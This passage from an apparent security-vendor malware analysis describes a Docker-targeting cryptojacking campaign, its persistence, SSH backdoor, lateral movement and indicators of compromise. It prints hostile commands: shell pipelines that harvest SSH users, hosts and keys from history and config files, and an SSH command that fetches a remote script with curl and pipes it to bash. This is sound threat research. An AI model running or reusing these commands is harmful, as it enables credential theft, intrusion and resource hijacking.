<p>Example contents of a modified  <em>amazon-ssm-agent.service</em> can be seen below:</p>
<pre class="language-bash"><code class="language-bash"><span class="highlight-line"><span class="token punctuation">[</span>Unit<span class="token punctuation">]</span></span>
<span class="highlight-line"><span class="token assign-left variable">Description</span><span class="token operator">=</span>amazon-ssm-agent</span>
<span class="highlight-line"><span class="token assign-left variable">After</span><span class="token operator">=</span>network-online.target</span>
<span class="highlight-line"></span>
<span class="highlight-line"><span class="token punctuation">[</span>Service<span class="token punctuation">]</span></span>
<span class="highlight-line"><span class="token assign-left variable">Type</span><span class="token operator">=</span>simple</span>
<span class="highlight-line"><span class="token assign-left variable">WorkingDirectory</span><span class="token operator">=</span>/usr/bin/</span>
<span class="highlight-line"><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/amazon-ssm-agent</span>
<mark class="highlight-line highlight-line-active"><span class="token assign-left variable">ExecStartPost</span><span class="token operator">=</span>/var/tmp/.222/top <span class="token comment"># line added by chkstart malware</span></mark>
<span class="highlight-line"><span class="token assign-left variable">KillMode</span><span class="token operator">=</span>process</span></code></pre>
<p>The attacker also uses <code>chkstart</code> to update the SSH daemonâs configuration, adding the following line:</p>
<p><code>AuthorizedKeysFile .ssh/authorized_keys .ssh/.ssh/zzhkeys</code></p>
<p>This ensures that public keys residing in <em>.ssh/authorized_keys</em> and <em>.ssh/.ssh/zzhkeys</em> can be used by the SSH server for authentication. The malware then proceeds to write an attacker-controlled key to <em>/root/.ssh/authorized_keys</em> and <em>/root/.ssh/.ssh/zzhkeys</em>.</p>
<pre><code>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver
</code></pre>
<p><em>Attacker-controlled SSH key</em></p>
<h3 id="resource-hijacking" tabindex="-1"><a class="header-anchor" href="#resource-hijacking">Resource Hijacking</a></h3>
<p>At this stage, the attacker has achieved persistent execution of a binary (named top),andâassuming that SSH is running, is publicly accessible, and has public key authentication enabledâhas backdoor access to the compromised host via SSH.</p>
<p>Contrary to previous binary payloads, <code>top</code> is stripped, meaning the developer attempted to obfuscate its functionality. Itâs also compiled from C++ code, rather than Go.</p>
<p>Despite these differences, the binary itself is rather uninteresting. Analysis shows that itâs a custom build of the XMRig miner, with a hardcoded configuration baked into the binary itself. This reveals the objective of the campaign: hijacking the resources of the Docker host to mine the XMRig cryptocurrency.</p>
<p>Details of the XMRig configuration extracted from <code>top</code> are included in the <a href="#indicators-of-compromise">Indicators of compromise</a> section below. Of note is the use of the <em>m.9-9-11[.]com</em>, <em>m.9-9-12[.]com</em>, <em>m.9-9-13[.]com</em>, and <em>m.9-9-14[.]com</em> domains as custom mining pools. <em>This indicates that the attacker uses the <em>b</em> subdomain to host payloads and the <em>m</em> subdomain to host mining pools.</em></p>
<h2 id="lateral-movement" tabindex="-1"><a class="header-anchor" href="#lateral-movement">Lateral Movement <a name="lateral-movement"></a></a></h2>
<p>After taking steps to launch an XMRig miner on the compromised hosts, the attackers deploy a new payload, named <code>exeremo</code>, and leverage it to move laterally to additional hosts.</p>
<p><code>exeremo</code> is another example of malicious functionality previously seen in shell scripts being ported to Go code. This binary is yet another unreported payload from this updated campaign and attempts to do the following:</p>
<ul>
<li>Identify related SSH servers and spread the malware to them</li>
<li>Add an infection marker to the host</li>
<li>Execute an additional shell script payload (<code>s.sh</code>)</li>
</ul>
<p><code>exeremo</code> includes several functions dedicated to extracting usernames, hosts, and private keys used in outbound SSH connections from the compromised server.</p>
<p>The malware achieves this by issuing a series of inline shell commands from Go functions within the binary itself. These commands are summarised in the table below.</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center"><strong>Go Function</strong></th>
<th style="text-align:center"><strong>Purpose</strong></th>
<th style="text-align:center"><strong>Shell Command(s)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>getUsers</strong></td>
<td style="text-align:center">Extracts SSH usernames from shell history files</td>
<td style="text-align:center"><code>cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep &quot;  @&quot; |grep -vw &quot; cp&quot;  | grep -vw &quot; mv&quot;  | grep -vw &quot; cd &quot;  | grep -vw &quot; nano&quot;  | grep -v grep | grep -E &quot; (ssh|scp)&quot;   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>getUniqueHosts</strong></td>
<td style="text-align:center">Extracts SSH hosts from shell history, SSH config files, and <em>known_hosts</em></td>
<td style="text-align:center"><code>cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot; HostName&quot;  '{print $2}'</code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot; (ssh|scp)&quot;  | grep -oP &quot; ([0-9]{1,3}\.){3}[0-9]{1,3}&quot; </code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot; (ssh|scp)&quot;  | tr ':' ' ' | awk -F '@' '{print $2}' | awk '{print $1}</code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat /etc/hosts | grep -vw &quot; 0.0.0.0&quot;  | grep -vw &quot; 127.0.1.1&quot;  | grep -vw &quot; 127.0.0.1&quot;  | sed -r '/\n/!s/[0-9.]+/\n&amp;amp;\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}'</code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot; ([0-9]{1,3}\.){3}[0-9]{1,3}&quot;  | uniq</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>getKeyList</strong></td>
<td style="text-align:center">Extracts SSH keys from shell history and SSH config files</td>
<td style="text-align:center"><code>cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot; IdentityFile&quot;  '{print $2 }'</code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot; (ssh|scp)&quot;  | awk -F ' -i ' '{print $2}' | awk '{print $1}'</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>getPortList</strong></td>
<td style="text-align:center">Searches shell history for evidence of SSH commands and extracts discovered usernames</td>
<td style="text-align:center"><code>echo &quot; 22&quot;  | cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw 'cp' | grep -vw 'mv' | grep -vw 'cd ' | grep -vw 'nano' | grep -v grep | grep -E '(ssh|scp)' | tr ':' ' ' | awk -F '-p' '{print $2}'</code></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><code>cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep &quot; @&quot; |grep -vw &quot; cp&quot;  | grep -vw &quot; mv&quot;  | grep -vw &quot; cd &quot;  | grep -vw &quot; nano&quot;  | grep -v grep | grep -E &quot; (ssh|scp)&quot;   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq</code></td>
</tr>
</tbody>
</table>
</div>
<p>The results of these commands are stored in memory and used to execute <code>ar.sh</code> on remote hosts via SSH remote command invocation. The SSH command used for this takes the following form:</p>
<p><code>ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i %s %s@%s -p%s 'nohup $(curl -A %s -Ls %s | bash);</code></p>
<p>To assist with identifying new Docker servers for exploitation, <code>exeremo</code> will retrieve another shell script payload named <code>s.sh</code>. This is read into memory and executed dynamically due to code from a function named <code>executeScriptFromURL</code>. Once again, this function leverages the <code>zzhbot</code> user agent string in the resulting HTTP request.</p>
<h3 id="ssh-stager-for-pnscan-masscan-and-a-custom-docker-discovery-utility" tabindex="-1"><a class="header-anchor" href="#ssh-stager-for-pnscan-masscan-and-a-custom-docker-discovery-utility"><code>s.sh</code>: Stager for pnscan, masscan, and a custom Docker discovery utility</a></h3>
<p><code>s.sh</code> contains similar code to the shell scripts seen in the original Spinning YARN campaign. Itâs responsible for installing various scanning tools commonly used in cloud and Linux malware attacks, for example <a href="https://github.com/ptrrkssn/pnscan">pnscan</a> and <a href="https://github.com/robertdavidgraham/masscan">masscan</a>.</p>
<p>The script also creates a directory at the path <em>/etc/.httpd/â¦.</em> and copies a binary named <code>sd</code> (extracted from m.tar and analysed below) into it, before renaming it as <code>httpd</code>. This naming convention is also used in the previous campaign and is likely an attempt to disguise the resulting process as the <code>httpd</code> HTTP server frequently found on Linux systems.</p>
<p>With the <code>sd</code> binary renamed, a systemd service is created at the following path to persistently launch the binary at boot:</p>
<p><code>/etc/systemd/system/zzhr.service</code></p>
<p>The following <code>systemctl</code> commands are executed to achieve this:</p>
<pre class="language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> zzhr.service
<span class="token function">sudo</span> systemctl daemon-reload
<span class="token function">sudo</span> systemctl start zzhr.service</code></pre>
<h3 id="additional-payloads" tabindex="-1"><a class="header-anchor" href="#additional-payloads">Additional payloads</a></h3>
<p>The following additional payloads were also discovered, but exhibit similar behaviors to samples from the original campaign, so arenât considered novel. For this reason, weâve summarized the functionality below.</p>
<h4 id="sdhttpd" tabindex="-1"><a class="header-anchor" href="#sdhttpd">sd/httpd</a></h4>
<p>This 64-bit Go ELF binary resembles the Docker initial access tool (<code>d.sh</code>) reported by Cado Security in their original blog on Spinning YARN. The malware uses <code>masscan</code> to scan a randomised <em>/8</em> network prefix for vulnerable Docker Engine hosts.</p>
<p>Once these hosts have been identified, the malware uses <a href="https://github.com/zmap/zgrab2">zgrab</a> to send the Docker reconnaissance commands described in the Initial Access section of this blog. If reconnaissance is successful, the malware will proceed to issue the previously described base64-encoded initial access command, kickstarting the infection on a new host.</p>
<h4 id="fkoths" tabindex="-1"><a class="header-anchor" href="#fkoths">fkoths</a></h4>
<p>Another 64-bit Go ELF binary, this appears to be an updated version of the fkoths payload discovered by Cado. Nothing of significance has changed with this payload, its main purpose remains to remove any Docker images created by the malware during the Initial Access phase, essentially performing anti-forensics on the host. It will also update <em>/etc/hosts/</em> to âblackholeâ requests to the Docker registry by redirecting them to the loopback address.</p>
<h2 id="how-datadog-can-help" tabindex="-1"><a class="header-anchor" href="#how-datadog-can-help">How Datadog can help</a></h2>
<p>Datadog Cloud Workload Security (CWS) comes with the following out-of-the-box runtime security rules, which enable you to detect the types of attacker activity discussed in this post:</p>
<ul>
<li><a href="https://docs.datadoghq.com/security/default_rules/open_docker_daemon/">Docker daemon publicly accessible</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/compiler_in_container/">Compiler executed in container</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/new_binary_execution_in_container/">File created and executed inside container</a></li>
<li><a href="https://docs.datadoghq.com/security/default_rules/suspected_dynamic_linker_hijacking/">Suspected dynamic linker hijacking attempt</a></li>
</ul>
<h2 id="conclusion" tabindex="-1"><a class="header-anchor" href="#conclusion">Conclusion</a></h2>
<p>This update to the Spinning YARN campaign shows a willingness to continue attacking misconfigured Docker hosts for initial access. The threat actor behind this campaign continues to iterate on deployed payloads by porting functionality to Go, which could indicate an attempt to hinder the analysis process, or point to experimentation with multi-architecture builds. The campaign contains several detection opportunities, and the <a href="#indicators-of-compromise">IoCs</a> extracted from this analysis should help identify activity associated with this campaign in your environment.</p>
<p>Lists of unused domains extracted from the payloads show that the campaign is very much active and is likely to continue for the foreseeable future. The attackers deployed resilient infrastructure, such as multiple C2 servers, mining pools, and additional payloads.</p>
<p>Although the likely objective of this campaign is to deploy an XMRig miner to compromised hosts, the attackers also ensured that they maintain access to victim machines via SSH. Maintaining remote code execution to victim hosts could mean that attackers can leverage their access for additional objectives</p>
<h2 id="indicators-of-compromise" tabindex="-1"><a class="header-anchor" href="#indicators-of-compromise">Indicators of Compromise <a name="indicators-of-compromise"></a></a></h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th style="text-align:center"><strong>Filepaths</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/usr/bin/vurl</td>
</tr>
<tr>
<td style="text-align:center">/etc/.../.ice-unix</td>
</tr>
<tr>
<td style="text-align:center">/etc/.httpd/...</td>
</tr>
<tr>
<td style="text-align:center">/etc/.httpd/.../httpd</td>
</tr>
<tr>
<td style="text-align:center">/etc/cron.d/zzh</td>
</tr>
<tr>
<td style="text-align:center">/etc/systemd/system/zzhr.service</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/m.tar</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/1.0.4.tar.gz</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/chkstart</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/exeremo</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/fkoths</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/p.tar</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/pnscan</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/top</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.222/zgrab</td>
</tr>
<tr>
<td style="text-align:center">/var/tmp/.dog</td>
</tr>
<tr>
<td style="text-align:center">/root/.ssh/.ssh/zzhkeys</td>
</tr>
<tr>
<td style="text-align:center">/tmp/m.service</td>
</tr>
</tbody>
</table>
</div>
<div class="table-wrapper"><table>
<thead>
<tr>
<th><strong>Domains/URLs</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>m.9-9-8[.]com</td>
</tr>
<tr>
<td>m.9-9-11[.]com</td>
</tr>
<tr>
<td>m.9-9-12[.]com</td>
</tr>
<tr>
<td>m.9-9-13[.]com</td>
</tr>
<tr>
<td>m.9-9-14[.]com</td>
</tr>
<tr>
<td>m.9-9-15[.]com</td>
</tr>
<tr>
<td>m.9-9-16[.]com</td>
</tr>
<tr>
<td>m.9-9-17[.]com</td>
</tr>
<tr>
<td>m.9-9-18[.]com</td>
</tr>
<tr>
<td>m.9-9-19[.]com</td>
</tr>
<tr>
<td>b.9-9-11[.]com</td>
</tr>
<tr>
<td>b.9-9-11[.]com/brysj/m/m.tar</td>
</tr>
<tr>
<td>b.9-9-11[.]com/brysj/d/ar.sh</td>
</tr>
<tr>
<td>b.9-9-11[.]com/brysj/d/ai.sh</td>
</tr>
<tr>
<td>b.9-9-11[.]com/brysj/d/s.sh</td>
</tr>
<tr>
<td>b.9-9-12[.]com</td>
</tr>
</tbody>
</table>
</div>
<div class="table-wrapper"><table>
<thead>
<tr>
<th><strong>IP Addresses</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>64[.]19.222.131</td>
</tr>
<tr>
<td>206[.]189.204.54</td>
</tr>
<tr>
<td>107[.]189.7.84</td>
</tr>
<tr>
<td>194[.]36.190.118</td>
</tr>
</tbody>
</table>
</div>
<div class="table-wrapper"><table>
<thead>
<tr>
<th><strong>Filename</strong></th>
<th><strong>SHA256</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>1.0.4.tar.gz</td>
<td>51de345f677f46595fc3bd747bfb61bc9ff130adcbec48f3401f8057c8702af9</td>
</tr>
<tr>
<td>ar.sh</td>
<td>12481d3fbcee0ed5aa8a9c8bc1aeb71bf9439cbddf68e8cd275c2a90b26ec0ad</td>
</tr>
<tr>
<td>b.sh</td>
<td>852a577b227aa856399ae836d9db15eee38a4f62301a8590f80a009ec29dad8a</td>
</tr>
<tr>
<td>chkstart</td>
<td>2063e682e631fc28d77b50b32494edf2cf37bcc1e85c6d0302b34fa2e30aa52f</td>
</tr>
<tr>
<td>exeremo</td>
<td>048a1fe62bcd51cbf91128012dc1c15f25b17133d241c25d6717c3caf766c1ec</td>
</tr>
<tr>
<td>fkoths</td>
<td>7044f839aecd91bc5e4deac327d0b41fdae9a8238a9b64510ff336e49ed92e08</td>
</tr>
<tr>
<td>m.tar</td>
<td>0d508268b3f6d3b5396d5d182e546e59311af1d4ebe03a7728e2fd2a212c008b</td>
</tr>
<tr>
<td>p.tar</td>
<td>b6ddd29b0f74c8cfbe429320e7f83427f8db67e829164b67b73ebbdcd75d162d</td>
</tr>
<tr>
<td>s.sh</td>
<td>32dfb086e6719c20666f151d17a3fbfcbccf559d0a8f1b2b888175f1a4d8f8a8</td>
</tr>
<tr>
<td>sd</td>
<td>f3925aad20636a17be343ff473e6acb86345bc82c6611daa2154e24cd5e670e8</td>
</tr>
<tr>
<td>top</td>
<td>dcff5f9e748c915aeefce08991d924197aff7f2a0affda00bfb45cfa1919b641</td>
</tr>
<tr>
<td>vurl</td>
<td>fdda14d3bc993960991ac6c95964514444e730f04b76d607df6e59087761648d</td>
</tr>
<tr>
<td>zgrab</td>
<td>f53b8f70f6aeb478781e17ffd16a0fbbe5a5a08b4c4c0597091bc3407794ed1b</td>
</tr>
</tbody>
</table>
</div>
<h4 id="xmrig-configuration" tabindex="-1"><a class="header-anchor" href="#xmrig-configuration">XMRig Configuration</a></h4>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"api"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"worker-id"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"http"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"host"</span><span class="token operator">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>
        <span class="token property">"port"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"access-token"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"restricted"</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"autosave"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"background"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"colors"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"randomx"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"init"</span><span class="token operator">:</span> <span class="token number">-1</span><span class="token punctuation">,</span>
        <span class="token property">"init-avx2"</span><span class="token operator">:</span> <span class="token number">-1</span><span class="token punctuation">,</span>
        <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"auto"</span><span class="token punctuation">,</span>
        <span class="token property">"1gb-pages"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"rdmsr"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wrmsr"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"cache_qos"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"numa"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"scratchpad_prefetch_mode"</span><span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"cpu"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"huge-pages"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"huge-pages-jit"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"hw-aes"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"priority"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"memory-pool"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"yield"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"max-threads-hint"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
        <span class="token property">"asm"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"argon2-impl"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"cn/0"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"cn-lite/0"</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"opencl"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"cache"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"loader"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"platform"</span><span class="token operator">:</span> <span class="token string">"AMD"</span><span class="token punctuation">,</span>
        <span class="token property">"adl"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"cn/0"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"cn-lite/0"</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"cuda"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"loader"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"nvml"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"cn/0"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"cn-lite/0"</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"donate-level"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token property">"donate-over-proxy"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token property">"log-file"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
    <span class="token property">"pools"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"algo"</span><span class="token operator">:</span> <span class="token string">"rx/0"</span><span class="token punctuation">,</span>
            <span class="token property">"coin"</span><span class="token operator">:</span> <span class="token string">"monero"</span><span class="token punctuation">,</span>
            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"m.9-9-11.com:8080"</span><span class="token punctuation">,</span>
            <span class="token property">"rig-id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"nicehash"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"keepalive"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"tls-fingerprint"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"daemon"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"socks5"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"self-select"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"submit-to-origin"</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>
            <span class="token property">"algo"</span><span class="token operator">:</span> <span class="token string">"rx/0"</span><span class="token punctuation">,</span>
            <span class="token property">"coin"</span><span class="token operator">:</span> <span class="token string">"monero"</span><span class="token punctuation">,</span>
            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"m.9-9-12.com:8080"</span><span class="token punctuation">,</span>
            <span class="token property">"rig-id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"nicehash"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"keepalive"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"tls-fingerprint"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"daemon"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"socks5"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"self-select"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"submit-to-origin"</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>
            <span class="token property">"algo"</span><span class="token operator">:</span> <span class="token string">"rx/0"</span><span class="token punctuation">,</span>
            <span class="token property">"coin"</span><span class="token operator">:</span> <span class="token string">"monero"</span><span class="token punctuation">,</span>
            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"m.9-9-13.com:8080"</span><span class="token punctuation">,</span>
            <span class="token property">"rig-id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"nicehash"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"keepalive"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"tls-fingerprint"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"daemon"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"socks5"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"self-select"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"submit-to-origin"</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>
            <span class="token property">"algo"</span><span class="token operator">:</span> <span class="token string">"rx/0"</span><span class="token punctuation">,</span>
            <span class="token property">"coin"</span><span class="token operator">:</span> <span class="token string">"monero"</span><span class="token punctuation">,</span>
            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"m.9-9-14.com:8080"</span><span class="token punctuation">,</span>
            <span class="token property">"rig-id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"nicehash"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"keepalive"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            <span class="token property">"tls"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"tls-fingerprint"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"daemon"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
